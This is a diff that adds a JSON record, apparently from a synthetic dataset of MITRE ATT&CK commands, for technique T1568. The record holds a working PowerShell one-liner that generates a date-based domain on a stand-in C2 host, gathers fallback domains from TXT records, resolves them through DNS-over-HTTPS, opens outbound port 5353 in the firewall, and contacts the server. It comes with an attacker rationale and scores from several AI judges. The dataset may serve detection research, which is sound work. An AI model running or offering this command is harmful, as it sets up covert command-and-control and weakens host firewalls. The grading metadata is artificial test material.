@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $seed=(Get-Date -Format 'yyMMdd'); $dom=('pool{0}.rotating-c2.com' -f $seed); $txt=Resolve-DnsName $dom -Type TXT -ErrorAction SilentlyContinue; $alts=((($txt | ForEach-Object { $_.Strings }) -join ',') -split ',') | Where-Object { $_ -match '^[a-z0-9\\.-]+$' }; $target=($alts + $dom) | Select-Object -First 1; $json=(Invoke-WebRequest -Uri ('https://dns.google/resolve?name={0}&type=1' -f $target) -UseBasicParsing -TimeoutSec 5).Content | ConvertFrom-Json; $ip=$json.Answer | Where-Object { $_.type -eq 1 } | Select-Object -First 1 -ExpandProperty data; if($ip){ netsh advfirewall firewall add rule name='out_5353' dir=out action=allow protocol=TCP remoteport=5353 | Out-Null; Invoke-WebRequest -Uri ('http://{0}:5353/p' -f $ip) -Headers @{ Host=$target } -TimeoutSec 6 -UseBasicParsing } }",
+  "explanation": "Extracts alternate rendezvous domains from TXT records, resolves via Google's DoH endpoint, permits outbound 5353, and contacts the resolved IP using the selected Host.",
+  "rationale_steps": [
+    "Generate a base DGA domain and query TXT for a fallback domain list.",
+    "Resolve the selected domain using DNS-over-HTTPS.",
+    "Allow egress on a rarely monitored port.",
+    "Issue an HTTP probe with Host header to support virtual host routing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-5b98f3ee-3258f085",
+  "source_prompt_hash": "5b98f3ee",
+  "timestamp_utc": "2025-09-30T09:58:10.642945Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced quotes, parentheses, and braces, proper command separators, valid flag formats, and appropriate error handling.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements the T1568 Dynamic Resolution technique by algorithmically generating domain names based on date, retrieving alternate C2 domains via TXT records, using DNS-over-HTTPS for resolution, and establishing command and control through a dynamically determined endpoint.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T05:45:30.845180Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell one-liner is well-formed with balanced quotes and braces, valid cmdlets/parameters, and proper pipelines/separators.",
+        "semantic_score": 5,
+        "semantic_justification": "It algorithmically generates a date-based domain, harvests alternate domains from TXT, resolves via DoH, selects an IP, and performs a contact using the chosen Host, aligning with T1568 dynamic resolution (firewall rule may need admin but does not block the core behavior).",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T05:45:57.657416Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed PowerShell, with balanced quotes, parentheses, proper command separators, and valid cmdlet parameters.",
+        "semantic_score": 4,
+        "semantic_justification": "The command extensively uses dynamic resolution (date-based DGA, TXT records for alternates, DoH resolution) to establish C2, aligning perfectly with T1568, but the `netsh` command to add a firewall rule requires elevated privileges, contradicting the stated 'Privilege: None'.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T05:58:20.481206Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
